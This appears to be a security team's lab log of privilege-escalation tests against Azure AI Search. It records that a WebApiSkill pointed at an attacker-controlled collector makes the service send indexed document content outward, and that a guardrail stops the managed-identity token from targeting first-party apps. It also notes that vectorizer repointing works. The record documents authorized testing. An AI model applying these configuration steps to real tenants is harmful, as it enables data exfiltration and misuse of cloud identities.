# AI Search — Tests Done

Wiki: `az-ai-search-privesc.md`.

| # | Technique | Min perms | Status |
|---|-----------|-----------|--------|
| 1 | `skillsets/write` / `debugSessions` WebApiSkill → SSRF + MI-token attach | `skillsets/write` (or `debugSessions/write`+`execute`) | **WORKS (SSRF) / constrained (token)** — verified 2026-09-24 |
| 2 | `searchServices/write` re-enable-auth / open-net / attach-identity | that action | DOC-ONLY |
| 3 | `indexes/write` schema-poison + vectorizer-repoint | that action | **WORKS** — live-fire confirmed on wiki (d1527e426): PUT 204 repoints vectorizer `uri`+`authResourceId` in place; query-time token attach, same 2 guardrails |
| 4 | sharedPrivateLink / privateEndpoint | those actions | DOC-ONLY (note) |

**Lab record (test #5, 2026-09-24, independent reproduction):** RG `htrc-aisearch`, Basic search service
`htrcsrch29616` (system-assigned MI `9f8f329d…`), collector = a Container App running
`mendhak/http-https-echo` with HTTPS ingress (`*.azurecontainerapps.io` valid cert), blob data source +
index + indexer.
- **SSRF / egress = WORKS.** A `WebApiSkill` with `uri=https://<collector>/ssrf-from-search` (no
  `authResourceId`) caused the indexer run to make an outbound POST to the attacker URL. Collector logs
  showed `user-agent: CognitiveSearch/WebApiSkill`, Azure egress IP `20.42.4.144`, carrying the document
  content. So `skillsets/write` (or `debugSessions`) = a confused-deputy egress/SSRF channel from the
  Search service's network position (HTTPS-only target).
- **MI-token exfil = CONSTRAINED (guardrail confirmed).** Setting `authResourceId` to the ARM first-party
  app id `797f4846-...` was **rejected**: *"targets a Microsoft first-party application… must identify your
  own application."* Format must be `api://{id}`, `api://{id}/.default`, or `{id}/.default`. So the token
  the service would attach can only target an **attacker-registered** app — NOT a replayable ARM/Graph/
  Storage/KV credential. Could not complete the token leg here (lab has no Graph directory-write to register
  an app), but the guardrail is the key finding.
- **Wiki already documents this comprehensively** (`az-ai-search-privesc.md` L107-146, commit d1527e426,
  incl. a decoded JWT captured via a registered app + the same first-party guardrail + the debugSessions
  on-demand and vectorizer-repoint query-time variants). **No wiki change** — this was an independent
  reproduction that also adds the plain SSRF/egress observation. **Teardown:** `az group delete htrc-aisearch`.
